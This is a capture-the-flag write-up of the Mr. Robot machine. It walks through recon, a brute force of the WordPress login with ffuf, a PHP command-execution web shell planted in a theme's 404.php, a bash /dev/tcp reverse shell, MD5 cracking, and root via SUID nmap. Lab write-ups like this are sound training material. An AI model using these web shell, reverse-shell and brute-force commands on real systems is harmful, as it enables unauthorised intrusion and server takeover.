# 🤖 Mr. Robot CTF — Full Write-Up

> **Platform:** TryHackMe / CTF Lab  
> **Difficulty:** Beginner / Intermediate  
> **Time to Root:** 49 minutes  
> **Keys Found:** 3 / 3

---

## Table of Contents

- [Overview](#overview)
- [Recon & Port Scanning](#1-recon--port-scanning)
- [Web Enumeration](#2-web-enumeration)
- [Key 1 — robots.txt](#3-key-1--robotstxt)
- [Wordlist Analysis](#4-wordlist-analysis)
- [WordPress Discovery](#5-wordpress-discovery)
- [Username Enumeration](#6-username-enumeration)
- [Password Brute Force](#7-password-brute-force)
- [Remote Code Execution via Theme Editor](#8-remote-code-execution-via-theme-editor)
- [Reverse Shell](#9-reverse-shell)
- [Key 2 — MD5 Crack & SSH](#10-key-2--md5-crack--ssh)
- [Privilege Escalation — SUID Nmap](#11-privilege-escalation--suid-nmap)
- [Key 3 — Root](#12-key-3--root)
- [Lessons Learned](#lessons-learned)

---

## Overview

This write-up covers my full thought process solving the **Mr. Robot** themed CTF machine — including dead ends, pivots, and the final root. The machine is built around themes from the TV show and rewards thorough enumeration at every step.

**Target IP:** `10.113.136.116`

---

## 1. Recon & Port Scanning

Started with a full port scan:

```bash
nmap -p- -sC -sV 10.113.136.116
```

| Flag | Purpose |
|------|---------|
| `-p-` | Scan all 65535 ports |
| `-sC` | Run default NSE scripts |
| `-sV` | Detect service versions |

**Output:**
```
Not shown: 65532 filtered tcp ports (no-response)
22/tcp  closed ssh
80/tcp  closed http
443/tcp closed https
```

Despite the closed ports, the website loaded fine in the browser. This suggested Nmap probes were being filtered. Rather than overthink it, I moved straight to web enumeration.

---

## 2. Web Enumeration

The landing page displayed a fake interactive terminal with the following commands:

```
prepare  /  fsociety  /  inform  /  question  /  wakeup  /  join
```

Inspecting the page source revealed almost no HTML — just a `<div id="app"></div>` with JavaScript handling all rendering. This indicated server-side logic was more interesting than client-side.

---

## 3. Key 1 — robots.txt

Checked the standard `robots.txt`:

```
http://10.113.136.116/robots.txt
```

**Response:**
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Visited the exposed file directly:

```
http://10.113.136.116/key-1-of-3.txt
```

✅ **Key 1 obtained.**

---

## 4. Wordlist Analysis

Downloaded `fsocity.dic` and inspected it:

```bash
wc -l fsocity.dic
# 858160 lines

sort fsocity.dic | uniq | wc -l
# 11451 unique entries
```

The list was massively inflated with duplicates. Cleaned it:

```bash
sort fsocity.dic | uniq > fclean.txt
```

This reduced ~858k entries down to ~11k — a much more usable wordlist.

---

## 5. WordPress Discovery

Tested common WordPress paths manually:

| Path | Result |
|------|--------|
| `/wp-admin` | ✅ Login page |
| `/wp-content` | 403 Forbidden |
| `/wp-includes` | 403 Forbidden |
| `/readme.html` | Trolling message |
| `/license.txt` | Trolling message |

WordPress confirmed. The modified readme/license files were intentional red herrings from the machine author.

---

## 6. Username Enumeration

Used WordPress's author redirect feature:

```
http://10.113.136.116/?author=1
```

Redirected to `/author/Elliot/` — valid username confirmed: **`Elliot`**

---

## 7. Password Brute Force

Used `ffuf` to brute force the WordPress login:

```bash
ffuf -w fclean.txt \
  -u http://10.113.136.116/wp-login.php \
  -X POST \
  -d "log=Elliot&pwd=FUZZ&wp-submit=Log+In" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -fr "The password you entered"
```

| Flag | Purpose |
|------|---------|
| `FUZZ` | Password injection point |
| `-fr` | Filter out failed login responses |

**Result:** `ER28-0652` returned HTTP 302 (redirect = successful login).

✅ Logged in as **Elliot**.

---

## 8. Remote Code Execution via Theme Editor

After exploring the dashboard (posts, pages, users, plugins — nothing interesting), I found the real attack surface:

**Appearance → Editor → 404.php**

The theme editor was enabled. I modified `404.php` to inject a command execution backdoor:

```php
<?php system($_GET['cmd']); ?>
```

**How it works:** `$_GET['cmd']` reads a URL parameter and passes it to `system()`, which executes it server-side.

Triggered it by visiting a non-existent page:

```
http://10.113.136.116/nonexistent?cmd=id
```

**Output:** `daemon`

✅ Remote Code Execution confirmed.

---

## 9. Reverse Shell

Set up a listener on my machine:

```bash
nc -lvnp 4444
```

Triggered a bash reverse shell via the RCE:

```bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
```

✅ Shell obtained as **`daemon`**.

---

## 10. Key 2 — MD5 Crack & SSH

Enumerated the home directory:

```bash
ls /home
# robot  ubuntu

ls /home/robot
# key-2-of-3.txt
# password.raw-md5
```

`key-2-of-3.txt` was permission-denied, but `password.raw-md5` was readable:

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

Cracked the MD5 hash (recognized as a known hash):

```
abcdefghijklmnopqrstuvwxyz
```

SSHed in as `robot`:

```bash
ssh robot@10.113.136.116
# Password: abcdefghijklmnopqrstuvwxyz

cat /home/robot/key-2-of-3.txt
```

✅ **Key 2 obtained.**

---

## 11. Privilege Escalation — SUID Nmap

Searched for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Notable result:

```
/usr/local/bin/nmap
```

Nmap with SUID root is a well-known privilege escalation vector. Older Nmap versions support an interactive mode:

```bash
/usr/local/bin/nmap --interactive
```

Inside the interactive shell:

```
!sh
```

Because the binary is owned by root with the SUID bit set, this spawns a root shell.

✅ **Root obtained.**

---

## 12. Key 3 — Root

```bash
cat /root/key-3-of-3.txt
```

✅ **Key 3 obtained.**

---

## Lessons Learned

- **Always check `robots.txt`** — it can expose sensitive files intentionally or accidentally.
- **Enumerate before exploiting** — author enumeration saved time before brute forcing.
- **Clean your wordlists** — 858k → 11k made the brute force viable.
- **WordPress theme editor = RCE** if accessible and writable.
- **SUID binaries are common escalation paths** — always run `find / -perm -4000`.
- **Sometimes Googling a hash is faster than cracking it.**

---

*Machine themed after [Mr. Robot](https://www.imdb.com/title/tt4158110/) — a show about an fsociety hacktivist. Highly recommended if you haven't seen it.*
